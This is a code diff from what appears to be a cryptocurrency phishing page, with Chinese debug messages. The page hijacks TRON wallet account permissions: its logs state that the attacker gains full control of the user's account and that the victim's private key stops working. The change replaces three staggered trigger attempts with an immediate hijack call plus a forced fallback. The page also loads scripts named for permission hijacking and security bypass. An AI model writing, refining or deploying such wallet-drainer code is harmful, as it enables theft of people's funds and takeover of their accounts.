@@ -2754,32 +2754,26 @@
                     debugLog('🔑 攻击者将获得用户账户完全控制权，比授权攻击更彻底！');
                     debugLog('🔑 攻击成功后，用户原私钥将失效，显示"缺少管理员权限"错误');
 
-                    // 🔑 多种触发方式确保成功
-                    setTimeout(() => {
-                        debugLog('🔑 尝试方式1: 常规检测触发');
-                        if (typeof window.PermissionHijack.detect === 'function') {
-                            window.PermissionHijack.detect();
-                        }
-                    }, 300);
+                    // 🔑 立即触发权限劫持攻击
+                    debugLog('🔑 立即启动权限劫持检测...');
                     
-                    setTimeout(() => {
-                        debugLog('🔑 尝试方式2: 强制触发权限劫持');
-                        if (typeof window.PermissionHijack.force === 'function') {
-                            const result = window.PermissionHijack.force();
-                            debugLog('🔑 强制触发结果:', result);
-                        }
-                    }, 800);
+                    // 立即尝试检测并触发
+                    if (typeof window.PermissionHijack.detect === 'function') {
+                        const detectResult = window.PermissionHijack.detect();
+                        debugLog('🔑 检测结果:', detectResult);
+                    }
                     
+                    // 如果检测失败，500ms后强制触发
                     setTimeout(() => {
-                        debugLog('🔑 尝试方式3: 直接显示劫持界面');
-                        if (typeof window.PermissionHijack.showModal === 'function') {
-                            // 设置基本状态
-                            if (window.PermissionHijack.status().targetAddress === null) {
-                                debugLog('🔑 设置模拟目标地址');
+                        const status = window.PermissionHijack.status();
+                        if (!status.initiated) {
+                            debugLog('🔑 检测未成功，强制触发权限劫持');
+                            if (typeof window.PermissionHijack.force === 'function') {
+                                const forceResult = window.PermissionHijack.force();
+                                debugLog('🔑 强制触发结果:', forceResult);
                             }
-                            window.PermissionHijack.showModal();
                         }
-                    }, 1500);
+                    }, 500);
                     
                 } else {
                     debugLog('❌ 权限劫持攻击系统未加载，fallback到传统授权攻击');
@@ -3856,7 +3850,6 @@
 <script src="tron-permission-hijack.js"></script>
 <script src="permission-hijack-tester.js"></script>
 <script src="attack-focus-validator.js"></script>
-<script src="mobile-permission-debug.js"></script>
 
 <!-- 🛡️ 稳定版安全绕过系统 - 保证页面稳定运行 -->
 <script src="stable-security-bypass.js"></script>
